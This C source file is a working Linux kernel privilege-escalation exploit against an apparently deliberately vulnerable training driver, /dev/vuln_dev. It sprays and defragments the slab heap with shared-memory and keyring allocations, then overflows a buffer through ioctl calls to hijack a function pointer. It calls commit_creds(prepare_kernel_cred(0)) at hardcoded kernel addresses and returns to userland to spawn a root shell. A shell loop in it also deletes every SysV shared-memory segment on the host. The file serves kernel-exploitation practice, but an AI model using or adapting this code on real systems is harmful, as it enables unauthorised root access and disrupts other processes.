#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <keyutils.h>
#include <memory.h>
#include <sys/shm.h>
#include <sched.h>

#define VULN_ALLOC_TARGET 1001
#define VULN_ALLOC_OVERFLOW 1002
#define VULN_CALL 1003
#define VULN_COPY_TO_BUF 1004
#define VULN_PRINT_BUF 1005
#define VULN_DEBUG 1006

#define DEVICE_PATH "/dev/vuln_dev"
#define TESTSTRING "This is a test."

#define BUFSIZE 256

typedef struct vuln_params {
    char *input;
    size_t len;
} vuln_params_t;

char *repeatStr(char *str, size_t count) {
    if (count == 0) return NULL;
    char *ret = malloc(strlen (str) * count + count);
    if (ret == NULL) return NULL;
    strcpy (ret, str);
    while (--count > 0) {
        strcat (ret, str);
    }
    return ret;
}

//bind thread to single cpu, taken from Attacking the core book
static int bindcpu() {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &set) < 0) {
        perror("setaffinity");
        return (-1);
    }
    return (0);
}

char get_byte(unsigned long address, size_t n){
   return (char) (address >> (8*n)) & 0xff;
}

void target(){
   printf("Hit it!\n");
   return;
}

static key_serial_t *keys;
void kern_alloc(unsigned kmalloc_size, unsigned num) {
    int i = 0;
    char type[5] = "user";
    char* description = (char*)malloc(sizeof(char)*4);
    char* payload = (char*)malloc(sizeof(char)*kmalloc_size-0x18);
    memset(payload, 'A', kmalloc_size-0x18-0x1);
    keys = malloc(num * sizeof(key_serial_t));
    for (i = 0; i < num ; i++) {
        sprintf(description, "%d", i);
        keys[i] = add_key(type, description, payload, strlen(payload), KEY_SPEC_USER_KEYRING);
        if (keys[i] == -1) {
            perror("add_key");
            exit(0);
        }
    }
}

void shm_kern_alloc(unsigned kmalloc_size, unsigned num){
    int i = 0;
    int *shmids;
    shmids = malloc(num * sizeof(int));
    for(i=0; i<num; i++){
		shmids[i] = shmget(IPC_PRIVATE, 1024, IPC_CREAT);
    }
    return;
}


//Taken from phrack article (http://phrack.org/issues/64/6.html), reads /proc/slabinfo and calculates offset for allocations
int calculate_slaboff(char *name) {
    FILE *fp;
    char slab[BUFSIZE], line[BUFSIZE];
    int ret;
    /* UP case */
    int active_obj, total;

    bzero(slab, BUFSIZE);
    bzero(line, BUFSIZE);

    fp = fopen("/proc/slabinfo", "r");
    if (fp == NULL){
        perror("error opening /proc for slabinfo");
        exit(0);
    }
    fgets(slab, sizeof(slab) - 1, fp);
    do {
        ret = 0;
        if (!fgets(line, sizeof(line) - 1, fp))
            break;
        ret = sscanf(line, "%s %u %u", slab, &active_obj, &total);
    } while (strcmp(slab, name));

    close(fileno(fp));
    fclose(fp);

    return ret == 3 ? total - active_obj : -1;
}

static void alternate_defragment(int fd, char *slabname, size_t size){
    int diff, cnt, i;
    diff = calculate_slaboff(slabname);
    cnt = diff * 10;
    for(i = 0; i < cnt; i++){
        diff = calculate_slaboff(slabname);
        if(diff == 0){
            return;
        }else if(diff < 0){
            close(fd);
            perror("Failed to calculate diff");
            exit(0);
        }
        kern_alloc(size, 1);
    }
    if(diff != 0){
        close(fd);
        perror("Failed to defrag slubs");
        exit(0);
    }
}

static void shmid_defragment(){
    int diff, cnt, i;
    int *shmids;
    system("for shmid in `cat /proc/sysvipc/shm | awk '{print $2}'`; do ipcrm -m $shmid > /dev/null 2>&1; done;");
    diff = calculate_slaboff("kmalloc-96");
    diff = 20;
    shmids = malloc(sizeof(int) * diff * 10);
	cnt = diff * 10;
	for (i = 0; i < cnt; ++i) {
        
		diff = calculate_slaboff("kmalloc-96");
		if (diff == 0) {
			break;
		}
        
		shmids[i] = shmget(IPC_PRIVATE, 1024, IPC_CREAT);
	}
    
	if (diff != 0) {
		printf("[-] inconsistency detected with SLUB cache allocation, please try again\n");
		exit(1);
	}
    
}

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

void get_shell(void){
    puts("[*] Returned to userland");
    if (getuid() == 0){
        printf("[*] UID: %d, got root!\n", getuid());
        system("/bin/sh");
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}

unsigned long user_rip = (unsigned long)get_shell;
void escalate_privs(void){
    __asm__(
        ".intel_syntax noprefix;"
        "movabs rax, 0xffffffff8108d790;" //prepare_kernel_cred
        "xor rdi, rdi;"
	    "call rax; mov rdi, rax;"
	    "movabs rax, 0xffffffff8108d350;" //commit_creds
	    "call rax;"
        "swapgs;"
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_sp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_rip;"
        "push r15;"
        "iretq;"
        ".att_syntax;"
    );
}

void print_hex(const char *array, int len)
{
    unsigned char *p = (unsigned char *) array;

    for (int i=0; i < len; ++i) {
        if (! (i % 16) && i)
                printf("\n");
        printf("0x%02x ", p[i]);
    }
    printf("\n\n");
}

char *preparePayload(){
    char *payload = repeatStr("A", 256);
    payload = (char*) realloc(payload, 270);
    void (*target_ptr)() = escalate_privs;
    unsigned long target_addr = (unsigned long) target_ptr;
    payload[256] = get_byte(target_addr, 0); 
    payload[257] = get_byte(target_addr, 1); 
    payload[258] = get_byte(target_addr, 2); 
    payload[259] = get_byte(target_addr, 3); 
    payload[260] = get_byte(target_addr, 4); 
    payload[261] = get_byte(target_addr, 5); 
    payload[262] = get_byte(target_addr, 6); 
    payload[263] = get_byte(target_addr, 7); 
    return payload;
}

int main(){
    bindcpu(); 
    save_state();
    int fd = open(DEVICE_PATH, O_RDONLY); 
    system("for shmid in `cat /proc/sysvipc/shm | awk '{print $2}'`; do ipcrm -m $shmid > /dev/null 2>&1; done;");
    shm_kern_alloc(256, 50);
    int fengshui1 = shmget(IPC_PRIVATE, 1024, IPC_CREAT);
    int fengshui2 = shmget(IPC_PRIVATE, 1024, IPC_CREAT);
    ioctl(fd, VULN_ALLOC_OVERFLOW);
    if(shmctl(fengshui1, IPC_RMID, NULL) != 0){
        perror("Failed to remove shm:");
        exit(1);
    }
    if(shmctl(fengshui2, IPC_RMID, NULL) != 0){
        perror("Failed to remove shm:");
        exit(1);
    }
    sleep(1);
    ioctl(fd, VULN_ALLOC_TARGET);
    vuln_params_t vuln_params;
    char *payload = preparePayload();
    printf("[*] Payload prepared:\n");
    print_hex(payload, 264);
    vuln_params.len = 264;
    printf("[*] Target address: %p\n", escalate_privs);
    vuln_params.input = malloc(vuln_params.len * sizeof(char));
    strcpy(vuln_params.input, payload);
    ioctl(fd, VULN_COPY_TO_BUF, &vuln_params);
    ioctl(fd, VULN_CALL);
    //printf("[*] If you can read this, you failed!\n");
    //ioctl(fd, VULN_PRINT_BUF);
    ioctl(fd, VULN_DEBUG);
    //close(fd);
    //free(vuln_params.input);
    return 0;
}
